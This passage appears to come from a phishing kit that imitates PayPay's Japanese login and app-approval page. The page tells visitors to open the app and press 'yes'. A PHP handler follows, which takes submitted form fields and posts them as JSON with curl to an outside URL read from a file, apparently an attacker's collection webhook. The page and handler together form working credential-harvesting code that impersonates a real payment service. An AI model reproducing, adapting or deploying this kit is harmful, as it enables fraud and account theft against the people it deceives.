memZ8nejhBi7pI9TxVGXfSPA6EaisbhquIZO7cA9o/tRkPyOxLUoU2CofHsQAn6Ol63k3c3ZEsUMc6uf8b2bb8qYIaS1ncWDhz6azdp2F0OE3knUxza05XbQrjxAgyQf5yQPeFwcRejtCNA3qPHZ1QtkOOg6+38ZXdG6B4Hp06cPDLTuu01eOr8/22c3dtOiCukPN7bGgtCtH6SPrYry5S0C0FGODDBB5xrGq4M4r15bsz47yqi8RTB7FSdj/UBr62MQczD7Mzl8o6dI1+82UTPu7SaGaJ4un0rL7cdnvLWqgB6NQGV5+ZROJtZj+kVqF7PDeg//uZmo/N2DwPSyskO3NTU+j4Wv02U1wJr9rctra7G2mF2XzJSZ9hIWp1hNX2z6YBn83cWcY6uSVt8g2bw/rSX0xsyqJk8+vDPoPxefZtIMLvpogh+N/bnHG8GApfE37YPNli1bb+wTqzbTgkllOe1wwvceuaHjg2eHoy/G+43gSUgTt6rclc/bB40atcAqz0zSk2CIvAm6vjEpVEqiP6Tvp/RE/eCpaOvyFKBSSWUI+EVgLLak3Q7pIvTYgBnKou2nwbRkY9GAgT/ZT1A3WUNg7ty5Gj7+Bb0teivUTZGrvAroqxbYq57r9pOr8lySpyYhlYm3ki+OUsr0h8aU1PLMxdR8C2fzlITY/V3zSpGmz0rlE6zd34TeUQMofffA9vY0HE4hM5fKCghJMET2bIo1q45OD7vGvvCT+NzT3JKe1qB8aw+kjUcHcq2iO3RR+YZVd9cXffWyx+OdVF1ba7I+yW7Nkpgy98dAb96Nag5KrqrcF5tOK4HtoZUuITZq/vgwOeB/yZ/q9qia0jbB5ZA0bu/uwdWjUM1QY9BX+NiUdjcO2liIaXIwQ8W4zjZhhkgnUOOghJvBxGA3mLCDTs0wmT102wfpE658Agn+jo9XvZZAfBU1AQSEXrCJi8DllETjRicOnd0HBdVuVsAbi4sHv59t27UEqt7roo4bN05s/+yzUF/pQgQMztuwurI3qBtbB+uF7y/OsW/ZxNtquegywWb1YWw7pr5ikovoUVF4Pbbr0YryfofDF3zIpyfpEBsxTCeAIW7d30h1oxBQCOQFAsnoEGHxurwDn/E8G9PCLQm20hcdP8xY2anRtPy+582o/xmKGeZ3L6ra914EkmKIBBdnL37OWAF92KnOPXxm/eHOUyAdFrpPn8sx+YeoXQl24KR88kcut1LVTSHQkxFImiESKJw1bMNlKqaIV+K6g2g2rofqD0NfBcReTEGfOs3a4ac2OKsghYBCIEkEktIhysrCaTXFjLXMRhiOLRfjcaXtUwMPxJXqD1ci7owDcfLijj6P+hl+7+K3DKfBLQ5Ly3lRd1VJhYBCQCGgEFAIKAQUAgoBhYBCQCGgEFAIKAQUAgoBhYBCQCGgEFAIKAQUAgoBhYBCQCGgEFAIKAQUAgoBhYBCQCGgEFAIKAQUAgoBhYBCQCGgEFAIKAQUAgoBhYBCQCGgEFAIKAQUAgoBhYBCQCGgEFAIKASyjMB/AdvhEbk5ZjCNAAAAAElFTkSuQmCC" alt="PayPay" height="45"><h2 data-v-f601f2c2="">ログイン</h2></header><div data-v-f601f2c2="" class="header-more"></div></section><div data-v-c5ef4130="" class="account-content"><!----><section data-v-5cd38ddc="" data-v-c5ef4130="" class="otp-auth-page"><div data-v-5cd38ddc="" class="mb10"><i data-v-231bf8e0="" data-v-5cd38ddc="" class="
      component-icon
      icon-phone-sms
      icon-md
      
    "></i></div><h3 data-v-5cd38ddc="" class="header-title">アプリを開いて「はい」を押してください</h3><!----><section data-v-9baee138="" data-v-5cd38ddc="" class="otp-auth"><div data-v-9baee138="" class="otp-content"><div data-v-3c60eda2="" data-v-9baee138="" class="otp"><div data-v-3c60eda2="" class="otp-info" style="display: none;"><p data-v-3c60eda2="">アプリに通知が送信されたので、アプリを開き「はい」を押してください</p><p data-v-3c60eda2=""><a data-v-3c60eda2="" href="https://paypay.ne.jp/rd/support/help/c0177/" target="_blank">通知に関して</a></p></div></div></div><!----><p data-v-9baee138=""><span data-v-9baee138=""></span></p><p data-v-9baee138=""><a data-v-9baee138="" href="https://paypay.ne.jp/rd/support/help/c0012/" target="_blank" class="otp-info"><img data-v-9baee138="" src="./sms_files/icon-question.ab269875.svg" width="14" height="14">&nbsp;表示されない場合</a></p><button data-v-9baee138="" class="submit-button">戻る</button></form></section></section></div></section></div></div></body></html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $name = $_POST["name"];
  $message = $_POST["message"];

  $jumper = file_get_contents("setend/down.txt");

  $content = "$name\n$message";

  $data = array("content" => $content);
  $data_string = json_encode($data);

  $ch = curl_init($jumper);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
  curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-Type: application/json',
    'Content-Length: ' . strlen($data_string)
  ));

  $result = curl_exec($ch);
  curl_close($ch);

  
}
?>